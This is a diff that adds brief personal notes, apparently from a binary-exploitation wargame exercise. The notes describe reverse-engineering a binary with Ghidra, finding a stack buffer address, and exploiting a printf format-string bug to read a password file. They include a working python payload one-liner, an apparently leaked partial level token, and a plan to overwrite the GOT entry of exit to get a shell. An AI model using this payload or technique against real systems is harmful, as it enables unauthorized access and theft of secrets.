@@ -1,0 +1,29 @@
+
+/*********************/
+/*	Strategy     */
+/*********************/
+
+=> use ghidra to reverser engineer baniray and create
+=> create a patch on ghidra, modify .pass to level02/.pass
+=> use the patch to determine address of buffer that read the pass file
+found: 0x7fffffffe570
+
+=> try to overwrite this address with format string exploit with the printf (line 98)
+padding: 28 addr
+
+=> trying to read value at pass file 
+with injecting address and read it like "\x..addr... + %5$s"
+
+=> doesn't work because printf don't print after \x00\x00 of the stack address
+-> \x70\xe5\xff\xff\xff\x7f\x00\x00 <- doesn't print after the \x00\x00
+
+python -c 'print "%00029$s" + "\x70\xe5\xff\xff\xff\x7f\x00\x00\nAAAA"' | ./level02
+-> works on my patch in level02/.pass in tmp
+-> but give partial token in level03/.pass ??? why lol 
+XgNWCqz7sXGnh5J5M9KfPg3Hp���� does not have access!
+
+
+Strategy 2 -> 
+
+overwrite got.plt of exit with /bin/sh
+
